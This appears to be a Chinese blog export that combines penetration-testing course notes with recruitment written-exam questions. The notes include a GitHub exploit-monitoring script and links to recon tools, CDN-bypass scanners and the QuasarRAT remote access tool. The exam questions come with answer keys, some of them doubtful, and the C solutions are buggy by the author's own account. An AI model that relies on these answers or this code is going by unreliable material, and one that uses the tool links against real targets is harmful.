<p><strong>总结</strong>：<br>主要是教怎么运用这个脚本做监控，信息收集是思路可以看下面这张图<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day10.webp"></p>
<h3 id="演示案例————监控最新的-EXP-发布及其他-（源代码）"><a href="#演示案例————监控最新的-EXP-发布及其他-（源代码）" class="headerlink" title="演示案例————监控最新的 EXP 发布及其他 （源代码）"></a>演示案例————监控最新的 EXP 发布及其他 （源代码）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Title: wechat push CVE-2020</span><br><span class="line"># Date: 2020-5-9</span><br><span class="line"># Exploit Author: weixiao9188</span><br><span class="line"># Version: 4.0</span><br><span class="line"># Tested on: Linux,windows</span><br><span class="line"># cd /root/sh/git/ &amp;&amp; nohup python3 /root/sh/git/git.py &amp;</span><br><span class="line"># coding:UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">time_sleep = 60   # 每隔 60 秒爬取一次</span><br><span class="line">while(True):</span><br><span class="line">    headers1 = &#123;</span><br><span class="line">                &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125;</span><br><span class="line">    # 判断文件是否存在</span><br><span class="line">    datas = []</span><br><span class="line">    response1 = None</span><br><span class="line">    response2 = None</span><br><span class="line">    if os.path.exists(&quot;olddata.csv&quot;):</span><br><span class="line">    # 如果文件存在则每次爬取 10 个</span><br><span class="line">        df = pd.read_csv(&quot;olddata.csv&quot;, header=None)</span><br><span class="line">        datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的 nan 转化为 None</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE2020&amp;sort=updated&amp;per_page=10&quot;,headers=headers1,verify=False)</span><br><span class="line">        response2 =</span><br><span class="line">requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;,hea</span><br><span class="line">ders=headers1,verify=False)</span><br><span class="line">    else:</span><br><span class="line">    # 不存在爬取全部</span><br><span class="line">        datas = []</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE2020&amp;sort=updated&amp;order=desc&quot;,headers=headers1,verify=False)</span><br><span class="line">        response2 =</span><br><span class="line">requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,heade</span><br><span class="line">rs=headers1,verify=False)</span><br><span class="line"></span><br><span class="line">    data1 = json.loads(response1.text)</span><br><span class="line">    data2 = json.loads(response2.text)</span><br><span class="line"></span><br><span class="line">    for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:</span><br><span class="line">        for i in j:</span><br><span class="line">            s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125;</span><br><span class="line">            s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]]</span><br><span class="line">        if s1 not in datas:</span><br><span class="line">        # print(s1）</span><br></pre></td></tr></table></figure>


<h2 id="网站资源补充"><a href="#网站资源补充" class="headerlink" title="网站资源补充"></a>网站资源补充</h2><h3 id="cdn网站"><a href="#cdn网站" class="headerlink" title="cdn网站"></a>cdn网站</h3><ol>
<li>查询偏僻国家ip — <a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a></li>
<li>查询域名的历史记录 — <a href="https://dnsdb.io/zh-cn">https://dnsdb.io/zh-cn</a></li>
<li>查询证书 — <a href="https://crt.sh/">https://crt.sh</a></li>
<li>查询子域名 — <a href="http://tools.bugscaner.com/">http://tools.bugscaner.com</a></li>
<li>扫全网IP工具 — <a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a>  </li>
<li>扫描全网地址访问CDN获取网站IP — <a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a>      </li>
</ol>
<h3 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="黑暗引擎"></a>黑暗引擎</h3><ol>
<li>shodan — shodan.io</li>
<li>zoomeye — zoomeye.org</li>
<li>fofa — fofa.so || fofa.info (目前上不去)</li>
</ol>
<h3 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h3><ul>
<li>云指纹(查cms的网站) — <a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li>
<li>在线cms指纹识别 — <a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li>
<li>指纹识别库 — <a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></li>
</ul>
<h3 id="资源网站"><a href="#资源网站" class="headerlink" title="资源网站"></a>资源网站</h3><ul>
<li>墨者学院(网安人才培养学习平台) — mozhe.cn </li>
<li>Vulhub 靶场(Web中间件常见漏洞总结) — <a href="https://www.vulhub.org/">https://www.vulhub.org/</a></li>
<li>CTF比赛例题网站 — <a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a> </li>
</ul>
<h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><ol>
<li>安卓模拟器 — <a href="http://www.xyaz.cn/">http://www.xyaz.cn</a></li>
<li>wsexplorer 抓包工具 — <a href="http://www.downcc.com/soft/11196.html">http://www.downcc.com/soft/11196.html</a>       </li>
<li>这个不知道是github的什么项目 — <a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a></li>
<li>漏了个大洞 — <a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg">https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg</a> 提取码：0b7b</li>
<li>github监视器 — <a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></li>
<li>各个语言与框架存在的漏洞 — <a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></li>
<li>nmap(端口扫描工具) — <a href="https://nmap.org/">https://nmap.org/</a></li>
<li>CMD5在线解密 — <a href="https://www.cmd5.com/">https://www.cmd5.com</a>   </li>
<li>在线加密解密工具 — <a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a>    </li>
<li>Discuz! Q — <a href="https://gitee.com/ComsenzDiscuz/DiscuzX">https://gitee.com/ComsenzDiscuz/DiscuzX</a></li>
<li>多个地点ping服务器 — <a href="http://ping.chinaz.com/">http://ping.chinaz.com</a></li>
<li>验证网站IP — <a href="https://www.get-site-ip.com/">https://www.get-site-ip.com/</a></li>
<li>国外地址请求 — <a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></li>
<li>同IP网站查询 — <a href="https://www.webscan.cc/">https://www.webscan.cc/</a>  </li>
<li>Web应用程序防火墙指纹识别工具 — <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  </li>
<li>站长之家 — <a href="http://tool.chinaz.com/">http://tool.chinaz.com</a></li>
<li>高精度IP定位 — opengps.cn</li>
</ol>
<h1 id="WEB漏洞"><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h1><h2 id="Day11-WEB漏洞——必懂知识点详解"><a href="#Day11-WEB漏洞——必懂知识点详解" class="headerlink" title="Day11 WEB漏洞——必懂知识点详解"></a>Day11 WEB漏洞——必懂知识点详解</h2><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day11-Web.webp"></p>
<h3 id="CTF，SRC，红蓝对抗，实战等"><a href="#CTF，SRC，红蓝对抗，实战等" class="headerlink" title="CTF，SRC，红蓝对抗，实战等"></a>CTF，SRC，红蓝对抗，实战等</h3><h4 id="简要说明以上漏洞危害情况"><a href="#简要说明以上漏洞危害情况" class="headerlink" title="简要说明以上漏洞危害情况"></a>简要说明以上漏洞危害情况</h4><ol>
<li>获取网站的数据库的权限（数据），后台账号和密码: SQL注入</li>
<li>直接获取网站权限: 文件上传</li>
</ol>
<h4 id="简要说明以上漏洞等级划分"><a href="#简要说明以上漏洞等级划分" class="headerlink" title="简要说明以上漏洞等级划分"></a>简要说明以上漏洞等级划分</h4><ol>
<li>高危：文件上传、SQL注入、代码执行、文件包含、未授权访问</li>
<li>中危：逻辑安全、目录遍历</li>
<li>低危：信息泄露 — 源码、部分账号密码</li>
</ol>
<h4 id="简要说明以上漏洞重点内容"><a href="#简要说明以上漏洞重点内容" class="headerlink" title="简要说明以上漏洞重点内容"></a>简要说明以上漏洞重点内容</h4><ol>
<li>CTF：SQL注入、反序列化、代码执行</li>
<li>SRC：以上都有，逻辑安全 — 0元购买</li>
<li>红蓝对抗：高危漏洞 — 权限</li>
</ol>
<h4 id="简要说明以上漏洞形势问题"><a href="#简要说明以上漏洞形势问题" class="headerlink" title="简要说明以上漏洞形势问题"></a>简要说明以上漏洞形势问题</h4><p>SQL注入网上没有：信息收集少；知识点不够；网站上确实没有此漏洞</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>卫士通 笔试题目</title>
    <url>/2022/09/16/%E5%8D%AB%E5%A3%AB%E9%80%9A-%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="卫士通-渗透测试工程师-校招笔试"><a href="#卫士通-渗透测试工程师-校招笔试" class="headerlink" title="卫士通 渗透测试工程师 校招笔试"></a>卫士通 渗透测试工程师 校招笔试</h3><h4 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h4><ol>
<li><p>攻击者通过XSS漏洞获取到QQ用户的cookie后，可以进行一下哪一步操作？    D<br> A. 劫持微信用户<br> B. 偷取Q币<br> C. 控制用户摄像头<br> D. 进入QQ空间</p>
</li>
<li><p>Firefox浏览器插件HackBar提供的功能没有什么    C<br> A. 修改浏览器访问referer<br> B. BASE64编码和解码<br> C. 代理修改WEB页面的内容<br> D. POST方式提交数据</p>
</li>
<li><p>以下哪个服务器未曾被发现文件解析漏洞    B<br> A. nginx<br> B. squid<br> C. Apache<br> D. IIS</p>
</li>
<li><p>哈希函数的输入长度是    C<br> A. 128bit<br> B. 160bit<br> C. 任意长度<br> D. 512bit</p>
</li>
<li><p>假如你向一台远程主机发送特定的数据包，却不想远程主机响应你的数据包，这时应该选择的攻击手段是    C<br> A. 缓冲区溢出<br> B. 暴力攻击<br> C. 地址欺骗<br> D. 拒绝服务</p>
</li>
<li><p>没有权限访问网页时，服务器返回什么状态码    D<br> A. 401<br> B. 200<br> C. 500<br> D. 403</p>
</li>
<li><p>下列哪类工具是日常被用来扫描 Web 漏洞的工具    C<br> A. Nmap<br> B. Nessus<br> C. IBM APPSCAN<br> D. X-SCAN</p>
</li>
<li><p>Apache默认解析后缀不包括    A<br> A. pht<br> B. php3<br> C. php5<br> D. phtml</p>
</li>
<li><p>高层的协议将数据传递到网络层后，形成（），而后传送到数据链路层    A<br> A. 数据包<br> B. 数据帧<br> C. 数据段<br> D. 信元</p>
</li>
<li><p>之前版本的中间件未出现过解析漏洞的是    A<br>A. Tomcat<br>B. Apache<br>C. IIS<br>D. ngnix</p>
</li>
<li><p>编写目录扫描工具时使用哪种请求方式可以增加扫描速度    C<br>A. GET<br>B. PUT<br>C. HEAD<br>D. POST</p>
</li>
<li><p>Oracle默认情况下口令的传输方式是    A<br>A. 明文传输<br>B. DES加密传输<br>C. 3DES加密传输<br>D. RSA加密传输</p>
</li>
<li><p>一个网站存在命令执行漏洞，由于服务器不能连外网，这时可以利用什么样的方式将文件上传到服务器    D<br>A. vbs<br>B. powershell<br>C. echo<br>D. FTP</p>
</li>
<li><p>TCP会话劫持除了SYN FLOOD攻击还需要    B<br>A. SYN扫描<br>B. 序列号预测<br>C. TCP扫描<br>D. SYN/ACK扫描</p>
</li>
<li><p>htaccess文件作用描述错误的是    D<br>A. 禁止目录列表<br>B. 配置默认文档<br>C. 自定义404错误页面<br>D. 修改密码</p>
</li>
<li><p>常规端口扫描和半开式扫描的区别是    B<br>A. 没什么区别<br>B. 没有完成三次握手，缺少ACK过程<br>C. 半开式采用UDP方式扫描<br>D. 扫描准确性不一样</p>
</li>
<li><p>以下数据库只能通过字典枚举数据表的是    A<br>A. mysql &lt; 5.0<br>B. mysql &gt; 5.0<br>C. oracle<br>D. mssql</p>
</li>
<li><p>黑客通过哪种攻击方式可以大批量获取网站注册用户信息    D<br>A. XSS<br>B. CSRF<br>C. 越权<br>D. 以上都可以</p>
</li>
<li><p>当Web服务器访问人数超过上限时，页面返回什么状态码    B<br>A. 200<br>B. 503<br>C. 403<br>D. 302</p>
</li>
<li><p>防御文件包含漏洞的方法不包括    B<br>A. 禁止自定义文件名<br>B. 禁止上传文件<br>C. 禁止文件名中包含目录名<br>D. 限制文件名中包含字母与数字</p>
</li>
<li><p>下面哪个口令可以打印Linux所有进程信息    C<br>A. su<br>B. ls -l<br>C. ps -ef<br>D. ls –d</p>
</li>
<li><p>以下哪个不是关系型数据库    C<br>A. mysql<br>B. mssql<br>C. redis<br>D. Oracle</p>
</li>
<li><p>如果一个网站存在CSRF漏洞，可以通过CSRF漏洞做什么    D<br>A. 获取网站用户注册的个人资料信息<br>B. 修改网站用户注册的个人资料信息<br>C. 冒用网站用户的身份发布信息<br>D. 以上都可以</p>
</li>
<li><p>在web页面中增加验证码功能后，下面说法正确的是    C<br>A. 可以防止注入攻击<br>B. 可以防止文件上传漏洞<br>C. 可以防止数据重复提交正确答案<br>D. 可以防止文件包含漏洞</p>
</li>
<li><p>向有限的空间输入超长的字符串的攻击手段是    A<br>A. 缓冲区溢出<br>B. 网络监听<br>C. 拒绝服务<br>D. IP欺骗</p>
</li>
<li><p>攻击者截获了从A发向B的数据，然后又从早些时候所截获的数据中提取出部分信息重新发往B，这种攻击方法称为    D<br>A. 暴力破解<br>B. 中间人攻击<br>C. 拒绝服务攻击<br>D. 重放攻击</p>
</li>
<li><p>数据完整性指的是    C<br>A. 保护网络中各系统之间交换的数据，防止因数据被截获而造成泄密<br>B.提供连接实体身份的鉴别<br>C. 防止非法实体对用户的主动攻击，保证数据接受方收到的信息与发送方发送的信息一致<br>D.确保数据是由合法实体发出的 </p>
</li>
</ol>
<h4 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h4><ol>
<li>如何防止DLL劫持</li>
</ol>
<p>DLL劫持利用系统未知DLL的搜索路径方式，使得程序加载当前目录下的系统同名DLL。所以可以告诉系统DLL的位置，改变加载系统DLL的顺序不是当前目录，而是直接到系统目录下查找。<br>　　<br>　　这个想法可以通过修改注册表实现： </p>
<ul>
<li>  在注册表键值：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</li>
<li>  是调用系统DLL的首要查找目录。例如里面有RE_SZ类型的”ntdll”=”ntdll.dll”项，则系统载入”ntdll”时会直接从系统目录加载。</li>
<li>  由此，添加”LPK”=”LPK.DLL”即可防止LPK被劫持，同理可以阻止一些其他DLL被劫持，例如”USP10”。</li>
</ul>
<p>　　在Windows NT系统，XP默认只有少数关键DLL在此键值下，Win7下面此键值已经相当齐全，在Win7系统下发生DLL劫持的概率要比XP小很多。</p>
<ol start="2">
<li>哪些是动态网页</li>
</ol>
<p>凡是结合了HTML以外的如Java、VB、VC等高级程序设计语言和数据库技术进行的网页编程技术生成的网页都是动态网页，能与后台数据库进行交互，数据传递。</p>
<p>通常以.aspx、.asp、.jsp、.php、.perl、.cgi 等形式为后缀，并且在动态网页网址中有一个标志性的符号——“?”。</p>
]]></content>
      <categories>
        <category>笔试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>字节跳动 笔试题目</title>
    <url>/2022/09/19/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8-%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h3><ol>
<li><p>网页返回500状态码时，以下说法正确的是    A<br> A. 服务器上发生错误<br> B. 请求的资源不在服务器上<br> C. 服务器拒绝请求<br> D. 请求的资源要求身份验证</p>
</li>
<li><p>网页无法访问时会出现什么状态码    C<br> A. 200<br> B. 302<br> C. 401<br> D. 404</p>
</li>
<li><p>当访问web网站的某个网页资源不存在时，将会返回什么状态码    D<br> A. 200<br> B. 302<br> C. 401<br> D. 404</p>
</li>
<li><p>IPSecVPN安全技术没有用到    D<br> A.端口映射技术<br> B.隧道技术<br> C.加密技术<br> D.入侵检测技术</p>
</li>
<li><p>下列选项中关于数据库事务的特性描述正确的是    D<br> A. 事务允许继续分割<br> B. 多个事务在执行事务前后对同一个数据读取的结果是不同的<br> C. 一个事务对数据库中数据的改变是暂时的<br> D. 并发访问数据库时，各并发事务之间数据库是独立的 </p>
</li>
</ol>
<h3 id="多选"><a href="#多选" class="headerlink" title="多选"></a>多选</h3><ol>
<li><p>哪些Linux命令可以用来查看进程信息    ABC<br> A. ps<br> B. top<br> C. pstree<br> D. ls</p>
</li>
<li><p>关于数据库锁，以下说法正确的是    AD<br> A. 数据库系统锁分为独占锁、共享锁和更新锁三种<br> B. 数据库需要通过特定机制确保死锁不会发生<br> C. 在表级锁锁定期间，其它进程无法对该表进行写操作，但可以执行读操作<br> D. 行级锁在多线程中相比页级锁更不容易产生锁定冲突</p>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>飞行棋</li>
</ol>
<p><strong>题目：</strong> </p>
<p>输入一组飞行棋棋子序号，对其进行分组，要求：<br>1⃣️ 每组包含五个棋子<br>2⃣️ 每个棋子只能分在一个组<br>3⃣️ 每组棋子序号相同</p>
<p><strong>测试用例：</strong><br>输入： 1 2 3 4 5<br>输出：false<br>【分析】 只能分为一个组，但棋子序号不同所以无法成功分组</p>
<p>输入： 1 1 1 1 2 1 2 2 2 2<br>输出： true<br>【分析】 可以成功分为两个组，分别为[1,1,1,1,1]、[2,2,2,2,2] </p>
<p><strong>代码：</strong> （通过率90%）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 输入</span><br><span class="line">    int x, n=0;  //n 输入个数</span><br><span class="line">    int a[] = &#123;0&#125;;  // a[] 输入棋子序号数组</span><br><span class="line">    while(scanf(&quot;%d&quot;, &amp;x) != EOF)&#123;</span><br><span class="line">        a[n] = x;</span><br><span class="line">        n += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //划分</span><br><span class="line">    int num = n / 5;  //可以分组个数</span><br><span class="line">    int tmp[] = &#123;0&#125;;  //记录每个分组的棋子序号</span><br><span class="line">    tmp[0] = a[0];</span><br><span class="line">    </span><br><span class="line">    for(int i=0; i&lt;n; i++)&#123;</span><br><span class="line">        for(int j=0; j&lt;n; j++)&#123;</span><br><span class="line">            if(a[j] != tmp[i])&#123;</span><br><span class="line">                tmp[i+1] = a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //判定分组</span><br><span class="line">    if(num == sizeof(tmp))&#123;</span><br><span class="line">        printf(&quot;true&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;false&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ol start="2">
<li>金字塔（很好 一看就不会 都没仔细读题）</li>
</ol>
]]></content>
      <tags>
        <tag>测试</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>百度 笔试题目</title>
    <url>/2022/09/20/%E7%99%BE%E5%BA%A6-%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><ol>
<li><p>过拟合问题在模型中广泛存在，下列缓解该问题的做法正确的是<br> A. 正则化<br> B. 增加数据集的规模<br> C. 增加特征量的数量<br> D. 增加Drop层</p>
</li>
<li><p>程序调试的内容不包括<br> A. 模块的关联性<br> B. 程序的正确性<br> C. 程序的运行速度<br> D. 程序使用的简便性</p>
</li>
<li><p>关于NSUserDefaults，描述不正确的是<br> A. 是专门用来保存应用程序的配置信息的<br> B. 会将所有数据保存到同一个文件中<br> C. [[NSUserDefaults standardUserDefaults] setInteger:21 forKey:@”age”];执行之后会立即写入<br> D. 一般存储在Library/Preferences路径下</p>
</li>
<li><p>下列数据结构中属于非线性结构的是<br> A. 二叉树<br> B. 栈<br> C. 循环链表<br> D. 串</p>
</li>
<li><p>在软件开发过程中，经常会出现模块和接口开发好之后，客户又要修改接口，从而造成多接口间出现兼容性问题，采用以下什么模式可以顺利解决上述问题<br> A. 命令模式<br> B. 单例模式<br> C. 适配器模式<br> D. 策略模式</p>
</li>
<li><p>哪个调度算法适用于CPU繁忙型作业<br> A. 先来先服务<br> B. 最短进程优先<br> C. 最短剩余时间优先<br> D. 最高响应比优先</p>
</li>
<li><p>下列关于有向图的说法正确的有 【多选】<br> A. 有向图中可以存在环<br> B. 有向图一定是赋权图<br> C. 有向图的强连通分量是指有向图中的极大强连通子图<br> D. 有向图所对应的邻接矩阵一定是对称阵</p>
</li>
<li><p>JMeter工具不能用于哪些应用的测试<br> A. UDP<br> B. Database via JDBC<br> C. FTP<br> D. SOAP/REST Webservices</p>
</li>
<li><p>设有向图中有n个顶点，则该有向图对应的邻接表中有几个表头结点<br> A. 2n+1<br> B. n+1<br> C. n<br> D. n-1</p>
</li>
<li><p>Internet通信中核心设备是路由器，路由器选择路径使用的地址是<br>A. IP<br>B. MAC<br>C. 主机名<br>D. 端口</p>
</li>
<li><p>当已有进程进入临界区时，所有其他视图进入该临界区的进程必须等待是指同步机制的<br>A. 空闲让进<br>B. 忙则等待<br>C. 让权等待<br>D. 有限等待</p>
</li>
<li><p>接口中所有数据域的修饰符是<br>A. private static final<br>B. public static final<br>C. private abstract<br>D. public abstract</p>
</li>
<li><p>SSReader具有什么文字识别功能<br>A. OCF<br>B. OCR<br>C. SCR<br>D. CAR</p>
</li>
<li><p>以下哪一个关键字不是python的异常处理结构所包含的关键字<br>A. finally<br>B. except<br>C. try<br>D. catch</p>
</li>
<li><p>已知串S=“aaab”，其Next数组值为<br>A. 1231<br>B. 1211<br>C. 1123<br>D. 0123</p>
</li>
<li><p>以下关于link标签preload，prefetch描述错误的是<br>A. prefetch告诉浏览器在后台下载并缓存资源<br>B. preload告诉浏览器在后台下载并缓存资源<br>C. prefetch预先解析域名<br>D. prefetch预先解析域名</p>
</li>
<li><p>关于Bagging的说法错误的是<br>A. bagging采用重抽样方法（有放回抽样）从原始样本中抽取一定数量的样本<br>B. 回归问题选用N个模型中最好的结果<br>C. bagging根据抽出的样本学习出一个模型<br>D. 分类问题采用N个模型预测投票的方式</p>
</li>
<li><p>下列不属于性能测试范围的是<br>A. 稳定性测试<br>B. 压力测试<br>C. 负载测试<br>D. 兼容性测试</p>
</li>
<li><p>应用层协议工作时先要通过传输层连接，必须通过UDP协议建立连接的应用层协议是<br>A. http<br>B. smtp<br>C. ssh<br>D. dhcp</p>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>战斗</li>
</ol>
<p><strong>题目描述</strong></p>
<p>小明是一位战士，某天他在和一个怪物战斗，他有n个技能，使用第i个技能能造成ai点伤害，在m个回合中， 每个回合只能释放一种技能，每种技能总共能释放任意次数，但不能连续释放同一个技能超过k次。请问他在这m回合中最多能造成多少伤害。</p>
<p><strong>输入描述</strong><br>第一行包含三个正整数n、m和k ，分别表示技能数量，回合数和同一个技能最多连续释放次数。<br>第二行包含n个正整数a1，a2，…，an (1 ≤ ai ≤ 109)，其中ai表示第 i 个技能能造成的伤害。<br>（ 2 ≤ n ≤ 50000，1 ≤ m ≤ 109，1 ≤ k ≤ 109 ）<br>数字间两两有空格隔开</p>
<p><strong>输出描述</strong><br>输出一个数，表示总共能造成伤害的最大值。</p>
<p><strong>测试样例</strong><br>输入：<br>4 4 2<br>4 3 2 1<br>输出：<br>15</p>
<p>【提示】可以先连续释放技能1两次，造成8点伤害，此时不能再释放技能1，所以释放技能2一次，造成3点伤害，再释放技能1一次，造成4点伤害，总计造成伤害15点，这是能达到的最大值。</p>
<p><strong>代码</strong> （样例通过但最终只有9%）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 输入</span><br><span class="line">    int n, m, k;</span><br><span class="line">    int tmp;</span><br><span class="line">    if(scanf(&quot;%d&quot;, &amp;tmp) != EOF)&#123;</span><br><span class="line">        n = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    if(scanf(&quot;%d&quot;, &amp;tmp) != EOF)</span><br><span class="line">      m = tmp;</span><br><span class="line">    if(scanf(&quot;%d&quot;, &amp;tmp) != EOF)</span><br><span class="line">      k = tmp; </span><br><span class="line">    int x[] = &#123;&#125;;</span><br><span class="line">    for(int i=0; i&lt;n; i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //计算</span><br><span class="line">    int max_1 = 0;</span><br><span class="line">    int max_2 = 0;</span><br><span class="line">    for(int i=1; i&lt;n; i++)&#123;</span><br><span class="line">        if(max_1 &lt; x[i] &amp;&amp; max_2 &lt; x[i])&#123;</span><br><span class="line">            max_1 = x[i];</span><br><span class="line">        &#125;else if(max_1 &gt; x[i] &amp;&amp; max_2 &lt; x[i])&#123;</span><br><span class="line">            max_2 = x[i];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int res=0;</span><br><span class="line">    if(m &lt;= k)&#123;</span><br><span class="line">        res += max_1 * m;</span><br><span class="line">    &#125;else if(m &gt; k)&#123;</span><br><span class="line">        int count = m/(k+1);</span><br><span class="line">        int mod = m % (k+1);</span><br><span class="line">        res += max_1 * k * count;</span><br><span class="line">        res += max_2 * count;</span><br><span class="line">        res += max_1 * mod;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    // 输出</span><br><span class="line">    printf(&quot;%d&quot;, res);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>魔法师</li>
</ol>
<p><strong>题目描述</strong><br>魔法师小树有n个魔法元素，他把它们排成一行，从左到右第i个魔法元素的能量值是一个非零整数ai。小树每次施展魔法的方式是挑选一段连续非空的魔法元素，将它们的能量值乘起来，得到值就是这次魔法的总能量。如果总能量大于零即为白魔法，否则为黑魔法。<br>现在小树想知道施展一个白魔法或黑魔法的方案数分别有多少。两个方案不同是指挑选的连续区间不同。</p>
<p><strong>输入描述</strong><br>第一行有一个整数 n (1≤ n ≤2*105 ),表示魔法元素的个数。<br>第二行有n个整数a1,a2,….,an（-109 ≤ ai ≤ 109;ai≠0）代表魔法元素的能量值。</p>
<p><strong>输出描述</strong><br>输出两个整数，分别表示施展一个白魔法和施展一个黑魔法的方案数。</p>
<p><strong>测试样例</strong><br>输入：<br>5<br>5 -3 3 -1 1<br>输出：<br>8 7</p>
<p><strong>代码</strong> （样例通过但最终只有23%）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 输入</span><br><span class="line">    int n;</span><br><span class="line">    int tmp;</span><br><span class="line">    if(scanf(&quot;%d&quot;, &amp;tmp) != EOF)</span><br><span class="line">      n = tmp;</span><br><span class="line">    int x[] = &#123;&#125;;</span><br><span class="line">    for(int i=0; i&lt;n; i++)&#123;</span><br><span class="line">      scanf(&quot;%d&quot;, &amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //计算</span><br><span class="line">    int white=0, black=0;</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">      int num=1;</span><br><span class="line">      num *= x[i];</span><br><span class="line">      for(int j=i+1; j&lt;n; j++)&#123;</span><br><span class="line">        num *= x[j];</span><br><span class="line">        if(num &gt; 0)&#123;</span><br><span class="line">          white = white + 1;</span><br><span class="line">        &#125;else if(num &lt; 0)&#123;</span><br><span class="line">          black = black +1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    for(int i=0; i&lt;n; i++)&#123;</span><br><span class="line">      if(x[i] &gt; 0)&#123;</span><br><span class="line">        white = white + 1;</span><br><span class="line">      &#125;else if(x[i] &lt; 0)&#123;</span><br><span class="line">        black = black +1;</span><br><span class="line">      